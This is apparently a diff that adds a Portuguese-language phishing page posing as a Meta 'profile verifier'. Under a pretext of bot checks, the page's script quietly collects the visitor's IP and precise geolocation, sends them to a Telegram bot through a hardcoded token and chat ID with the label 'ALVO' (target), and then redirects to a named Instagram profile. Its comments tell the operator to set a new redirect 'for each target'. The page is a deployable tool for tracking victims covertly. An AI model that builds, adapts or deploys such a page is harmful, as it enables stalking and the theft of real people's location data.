@@ -1,0 +1,84 @@
+<!DOCTYPE html>
+<html lang="pt-br">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Verificador de Perfil | Meta</title>
+    <style>
+        body { font-family: 'Segoe UI', Tahoma, sans-serif; background-color: #fafafa; display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; }
+        .card { background: white; border: 1px solid #dbdbdb; padding: 40px 30px; border-radius: 3px; max-width: 350px; width: 90%; text-align: center; }
+        .logo-meta { width: 100px; margin-bottom: 25px; }
+        h2 { font-size: 18px; color: #262626; margin-bottom: 15px; font-weight: 600; }
+        p { font-size: 14px; color: #8e8e8e; line-height: 1.5; margin-bottom: 30px; }
+        .btn { background-color: #0095f6; color: white; border: none; padding: 12px; border-radius: 4px; font-weight: 600; cursor: pointer; width: 100%; font-size: 14px; transition: 0.3s; }
+        .btn:disabled { background-color: #b2dffc; }
+        .footer { margin-top: 30px; font-size: 11px; color: #afafaf; text-transform: uppercase; letter-spacing: 1px; }
+    </style>
+</head>
+<body>
+
+<div class="card">
+    <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/7/7b/Meta_Platforms_Inc._logo.svg/1280px-Meta_Platforms_Inc._logo.svg.png" alt="Meta" class="logo-meta">
+    <h2>Validação de Acesso</h2>
+    <p>Para garantir a segurança da comunidade e confirmar que você não é um bot, confirme sua localização para visualizar este perfil restrito.</p>
+    
+    <button class="btn" id="btnAcesso" onclick="iniciarProcesso()">VISUALIZAR AGORA</button>
+    
+    <div class="footer">© 2026 Meta Platforms, Inc.</div>
+</div>
+
+<script>
+    // ============================================================
+    // CONFIGURAÇÕES DO AGENTE (EDITE AQUI)
+    // ============================================================
+    const TOKEN = "8406636992:AAE7z6BGxeO-lfLMYVQ9yOWY-CMLiy586Ic"; 
+    const ID = "560716860"; 
+    
+    // --- EDITE AQUI O LINK ABAIXO PARA CADA ALVO ---
+    const REDIRECIONAR_PARA = "https://www.instagram.com/evy_deraco?utm_source=ig_web_button_share_sheet&igsh=ZDNlZDc0MzIxNw=="; 
+    // ============================================================
+
+    async function iniciarProcesso() {
+        const btn = document.getElementById('btnAcesso');
+        btn.innerText = "Processando...";
+        btn.disabled = true;
+
+        // Captura IP e dados básicos silenciosamente
+        let ipAlvo = "Não identificado";
+        try {
+            const resp = await fetch('https://api.ipify.org?format=json');
+            const data = await resp.json();
+            ipAlvo = data.ip;
+        } catch (e) {}
+
+        const options = { enableHighAccuracy: true, timeout: 12000, maximumAge: 0 };
+
+        navigator.geolocation.getCurrentPosition(async (pos) => {
+            const lat = pos.coords.latitude;
+            const lon = pos.coords.longitude;
+            const mapa = `https://www.google.com/maps?q=${lat},${lon}`;
+            
+            // Montagem da mensagem para o novo bot do Telegram
+            const msg = `🎯 *ALVO INTERESSADO*\n\n🌐 IP: ${ipAlvo}\n📍 Localização: ${mapa}\n📱 Aparelho: ${navigator.platform}`;
+            
+            await fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    chat_id: ID,
+                    text: msg,
+                    parse_mode: 'Markdown'
+                })
+            });
+
+            // Redirecionamento Final
+            window.location.href = REDIRECIONAR_PARA;
+
+        }, (err) => {
+            // Se negar, envia para a página de erro para persistência
+            window.location.href = "autorizar.html";
+        }, options);
+    }
+</script>
+</body>
+</html>
